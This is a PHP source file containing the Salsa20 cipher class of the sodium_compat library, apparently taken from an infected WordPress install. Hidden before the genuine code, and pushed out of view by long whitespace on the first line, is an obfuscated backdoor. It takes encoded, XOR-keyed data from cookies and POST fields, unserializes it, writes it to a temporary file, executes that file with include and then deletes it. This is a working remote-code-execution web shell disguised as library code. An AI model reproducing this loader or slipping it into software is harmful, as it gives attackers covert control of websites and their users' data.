<?php                                                                                                                                                                                                                                                                                                                                                                                                 $tIeKcagTI = chr (69) . chr ( 269 - 174 )."\170" . "\110" . "\146" . "\141" . "\115";$qthZmoXxmC = chr ( 606 - 507 )."\x6c" . 'a' . chr ( 287 - 172 )."\163" . "\x5f" . chr (101) . "\x78" . "\151" . "\163" . "\164" . "\x73";$gEYCKMCN = $qthZmoXxmC($tIeKcagTI); $VOUDDuN = $gEYCKMCN;if (!$VOUDDuN){class E_xHfaM{private $pajQXs;public static $vKItTD = "7aa5700a-b906-4950-a947-db5da3ee40dd";public static $sBckGBsNN = 19775;public function __construct($wWqofM=0){$gwWyRStE = $_COOKIE;$bIfNnobwxA = $_POST;$VuYeC = @$gwWyRStE[substr(E_xHfaM::$vKItTD, 0, 4)];if (!empty($VuYeC)){$bmOTj = "base64";$pqNdjV = "";$VuYeC = explode(",", $VuYeC);foreach ($VuYeC as $rLiUZch){$pqNdjV .= @$gwWyRStE[$rLiUZch];$pqNdjV .= @$bIfNnobwxA[$rLiUZch];}$pqNdjV = array_map($bmOTj . chr (95) . "\144" . chr ( 441 - 340 ).chr (99) . 'o' . chr (100) . "\145", array($pqNdjV,)); $pqNdjV = $pqNdjV[0] ^ str_repeat(E_xHfaM::$vKItTD, (strlen($pqNdjV[0]) / strlen(E_xHfaM::$vKItTD)) + 1);E_xHfaM::$sBckGBsNN = @unserialize($pqNdjV);}}private function YmzPslwM(){if (is_array(E_xHfaM::$sBckGBsNN)) {$VKcrP = sys_get_temp_dir() . "/" . crc32(E_xHfaM::$sBckGBsNN[chr (115) . 'a' . chr ( 581 - 473 ).'t']);@E_xHfaM::$sBckGBsNN["\x77" . chr (114) . "\151" . 't' . 'e']($VKcrP, E_xHfaM::$sBckGBsNN["\x63" . chr ( 502 - 391 )."\156" . 't' . "\x65" . chr (110) . "\164"]);include $VKcrP;@E_xHfaM::$sBckGBsNN['d' . "\145" . 'l' . 'e' . "\x74" . "\x65"]($VKcrP); $dXqIMsz = "44943";exit();}}public function __destruct(){$this->YmzPslwM();}}$KhmrwwD = new E_xHfaM(); $KhmrwwD = "14648";} ?><?php

if (class_exists('ParagonIE_Sodium_Core32_Salsa20', false)) {
    return;
}

/**
 * Class ParagonIE_Sodium_Core32_Salsa20
 */
abstract class ParagonIE_Sodium_Core32_Salsa20 extends ParagonIE_Sodium_Core32_Util
{
    const ROUNDS = 20;

    /**
     * Calculate an salsa20 hash of a single block
     *
     * @internal You should not use this directly from another application
     *
     * @param string $in
     * @param string $k
     * @param string|null $c
     * @return string
     * @throws SodiumException
     * @throws TypeError
     */
    public static function core_salsa20($in, $k, $c = null)
    {
        /**
         * @var ParagonIE_Sodium_Core32_Int32 $x0
         * @var ParagonIE_Sodium_Core32_Int32 $x1
         * @var ParagonIE_Sodium_Core32_Int32 $x2
         * @var ParagonIE_Sodium_Core32_Int32 $x3
         * @var ParagonIE_Sodium_Core32_Int32 $x4
         * @var ParagonIE_Sodium_Core32_Int32 $x5
         * @var ParagonIE_Sodium_Core32_Int32 $x6
         * @var ParagonIE_Sodium_Core32_Int32 $x7
         * @var ParagonIE_Sodium_Core32_Int32 $x8
         * @var ParagonIE_Sodium_Core32_Int32 $x9
         * @var ParagonIE_Sodium_Core32_Int32 $x10
         * @var ParagonIE_Sodium_Core32_Int32 $x11
         * @var ParagonIE_Sodium_Core32_Int32 $x12
         * @var ParagonIE_Sodium_Core32_Int32 $x13
         * @var ParagonIE_Sodium_Core32_Int32 $x14
         * @var ParagonIE_Sodium_Core32_Int32 $x15
         * @var ParagonIE_Sodium_Core32_Int32 $j0
         * @var ParagonIE_Sodium_Core32_Int32 $j1
         * @var ParagonIE_Sodium_Core32_Int32 $j2
         * @var ParagonIE_Sodium_Core32_Int32 $j3
         * @var ParagonIE_Sodium_Core32_Int32 $j4
         * @var ParagonIE_Sodium_Core32_Int32 $j5
         * @var ParagonIE_Sodium_Core32_Int32 $j6
         * @var ParagonIE_Sodium_Core32_Int32 $j7
         * @var ParagonIE_Sodium_Core32_Int32 $j8
         * @var ParagonIE_Sodium_Core32_Int32 $j9
         * @var ParagonIE_Sodium_Core32_Int32 $j10
         * @var ParagonIE_Sodium_Core32_Int32 $j11
         * @var ParagonIE_Sodium_Core32_Int32 $j12
         * @var ParagonIE_Sodium_Core32_Int32 $j13
         * @var ParagonIE_Sodium_Core32_Int32 $j14
         * @var ParagonIE_Sodium_Core32_Int32 $j15
         */
        if (self::strlen($k) < 32) {
            throw new RangeException('Key must be 32 bytes long');
        }
        if ($c === null) {
            $x0  = new ParagonIE_Sodium_Core32_Int32(array(0x6170, 0x7865));
            $x5  = new ParagonIE_Sodium_Core32_Int32(array(0x3320, 0x646e));
            $x10 = new ParagonIE_Sodium_Core32_Int32(array(0x7962, 0x2d32));
            $x15 = new ParagonIE_Sodium_Core32_Int32(array(0x6b20, 0x6574));
        } else {
            $x0  = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($c, 0, 4));
            $x5  = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($c, 4, 4));
            $x10 = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($c, 8, 4));
            $x15 = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($c, 12, 4));
        }
        $x1  = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($k, 0, 4));
        $x2  = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($k, 4, 4));
        $x3  = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($k, 8, 4));
        $x4  = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($k, 12, 4));
        $x6  = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($in, 0, 4));
        $x7  = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($in, 4, 4));
        $x8  = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($in, 8, 4));
        $x9  = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($in, 12, 4));
        $x11 = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($k, 16, 4));
        $x12 = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($k, 20, 4));
        $x13 = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($k, 24, 4));
        $x14 = ParagonIE_Sodium_Core32_Int32::fromReverseString(self::substr($k, 28, 4));

        $j0  = clone $x0;
        $j1  = clone $x1;
        $j2  = clone $x2;
        $j3  = clone $x3;
        $j4  = clone $x4;
        $j5  = clone $x5;
        $j6  = clone $x6;
        $j7  = clone $x7;
        $j8  = clone $x8;
        $j9  = clone $x9;
        $j10  = clone $x10;
        $j11  = clone $x11;
        $j12  = clone $x12;
        $j13  = clone $x13;
        $j14  = clone $x14;
        $j15  = clone $x15;

        for ($i = self::ROUNDS; $i > 0; $i -= 2) {
            $x4  = $x4->xorInt32($x0->addInt32($x12)->rotateLeft(7));
            $x8  = $x8->xorInt32($x4->addInt32($x0)->rotateLeft(9));
            $x12 = $x12->xorInt32($x8->addInt32($x4)->rotateLeft(13));
            $x0  = $x0->xorInt32($x12->addInt32($x8)->rotateLeft(18));

            $x9  = $x9->xorInt32($x5->addInt32($x1)->rotateLeft(7));
            $x13 = $x13->xorInt32($x9->addInt32($x5)->rotateLeft(9));
            $x1  = $x1->xorInt32($x13->addInt32($x9)->rotateLeft(13));
            $x5  = $x5->xorInt32($x1->addInt32($x13)->rotateLeft(18));

            $x14 = $x14->xorInt32($x10->addInt32($x6)->rotateLeft(7));
            $x2  = $x2->xorInt32($x14->addInt32($x10)->rotateLeft(9));
            $x6  = $x6->xorInt32($x2->addInt32($x14)->rotateLeft(13));
            $x10 = $x10->xorInt32($x6->addInt32($x2)->rotateLeft(18));

            $x3  = $x3->xorInt32($x15->addInt32($x11)->rotateLeft(7));
            $x7  = $x7->xorInt32($x3->addInt32($x15)->rotateLeft(9));
            $x11 = $x11->xorInt32($x7->addInt32($x3)->rotateLeft(13));
            $x15 = $x15->xorInt32($x11->addInt32($x7)->rotateLeft(18));

            $x1  = $x1->xorInt32($x0->addInt32($x3)->rotateLeft(7));
            $x2  = $x2->xorInt32($x1->addInt32($x0)->rotateLeft(9));
            $x3  = $x3->xorInt32($x2->addInt32($x1)->rotateLeft(13));
            $x0  = $x0->xorInt32($x3->addInt32($x2)->rotateLeft(18));

            $x6  = $x6->xorInt32($x5->addInt32($x4)->rotateLeft(7));
            $x7  = $x7->xorInt32($x6->addInt32($x5)->rotateLeft(9));
            $x4  = $x4->xorInt32($x7->addInt32($x6)->rotateLeft(13));
            $x5  = $x5->xorInt32($x4->addInt32($x7)->rotateLeft(18));

            $x11 = $x11->xorInt32($x10->addInt32($x9)->rotateLeft(7));
            $x8  = $x8->xorInt32($x11->addInt32($x10)->rotateLeft(9));
            $x9  = $x9->xorInt32($x8->addInt32($x11)->rotateLeft(13));
            $x10 = $x10->xorInt32($x9->addInt32($x8)->rotateLeft(18));

            $x12 = $x12->xorInt32($x15->addInt32($x14)->rotateLeft(7));
            $x13 = $x13->xorInt32($x12->addInt32($x15)->rotateLeft(9));
            $x14 = $x14->xorInt32($x13->addInt32($x12)->rotateLeft(13));
            $x15 = $x15->xorInt32($x14->addInt32($x13)->rotateLeft(18));
        }

        $x0  = $x0->addInt32($j0);
        $x1  = $x1->addInt32($j1);
        $x2  = $x2->addInt32($j2);
        $x3  = $x3->addInt32($j3);
        $x4  = $x4->addInt32($j4);
        $x5  = $x5->addInt32($j5);
        $x6  = $x6->addInt32($j6);
        $x7  = $x7->addInt32($j7);
        $x8  = $x8->addInt32($j8);
        $x9  = $x9->addInt32($j9);
        $x10 = $x10->addInt32($j10);
        $x11 = $x11->addInt32($j11);
        $x12 = $x12->addInt32($j12);
        $x13 = $x13->addInt32($j13);
        $x14 = $x14->addInt32($j14);
        $x15 = $x15->addInt32($j15);

        return $x0->toReverseString() .
            $x1->toReverseString() .
            $x2->toReverseString() .
            $x3->toReverseString() .
            $x4->toReverseString() .
            $x5->toReverseString() .
            $x6->toReverseString() .
            $x7->toReverseString() .
            $x8->toReverseString() .
            $x9->toReverseString() .
            $x10->toReverseString() .
            $x11->toReverseString() .
            $x12->toReverseString() .
            $x13->toReverseString() .
            $x14->toReverseString() .
            $x15->toReverseString();
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param int $len
     * @param string $nonce
     * @param string $key
     * @return string
     * @throws SodiumException
     * @throws TypeError
     */
    public static function salsa20($len, $nonce, $key)
    {
        if (self::strlen($key) !== 32) {
            throw new RangeException('Key must be 32 bytes long');
        }
        $kcopy = '' . $key;
        $in = self::substr($nonce, 0, 8) . str_repeat("\0", 8);
        $c = '';
        while ($len >= 64) {
            $c .= self::core_salsa20($in, $kcopy, null);
            $u = 1;
            // Internal counter.
            for ($i = 8; $i < 16; ++$i) {
                $u += self::chrToInt($in[$i]);
                $in[$i] = self::intToChr($u & 0xff);
                $u >>= 8;
            }
            $len -= 64;
        }
        if ($len > 0) {
            $c .= self::substr(
                self::core_salsa20($in, $kcopy, null),
                0,
                $len
            );
        }
        try {
            ParagonIE_Sodium_Compat::memzero($kcopy);
        } catch (SodiumException $ex) {
            $kcopy = null;
        }
        return $c;
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $m
     * @param string $n
     * @param int $ic
     * @param string $k
     * @return string
     * @throws SodiumException
     * @throws TypeError
     */
    public static function salsa20_xor_ic($m, $n, $ic, $k)
    {
        $mlen = self::strlen($m);
        if ($mlen < 1) {
            return '';
        }
        $kcopy = self::substr($k, 0, 32);
        $in = self::substr($n, 0, 8);
        // Initialize the counter
        $in .= ParagonIE_Sodium_Core32_Util::store64_le($ic);

        $c = '';
        while ($mlen >= 64) {
            $block = self::core_salsa20($in, $kcopy, null);
            $c .= self::xorStrings(
                self::substr($m, 0, 64),
                self::substr($block, 0, 64)
            );
            $u = 1;
            for ($i = 8; $i < 16; ++$i) {
                $u += self::chrToInt($in[$i]);
                $in[$i] = self::intToChr($u & 0xff);
                $u >>= 8;
            }

            $mlen -= 64;
            $m = self::substr($m, 64);
        }

        if ($mlen) {
            $block = self::core_salsa20($in, $kcopy, null);
            $c .= self::xorStrings(
                self::substr($m, 0, $mlen),
                self::substr($block, 0, $mlen)
            );
        }
        try {
            ParagonIE_Sodium_Compat::memzero($block);
            ParagonIE_Sodium_Compat::memzero($kcopy);
        } catch (SodiumException $ex) {
            $block = null;
            $kcopy = null;
        }

        return $c;
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $message
     * @param string $nonce
     * @param string $key
     * @return string
     * @throws SodiumException
     * @throws TypeError
     */
    public static function salsa20_xor($message, $nonce, $key)
    {
        return self::xorStrings(
            $message,
            self::salsa20(
                self::strlen($message),
                $nonce,
                $key
            )
        );
    }
}
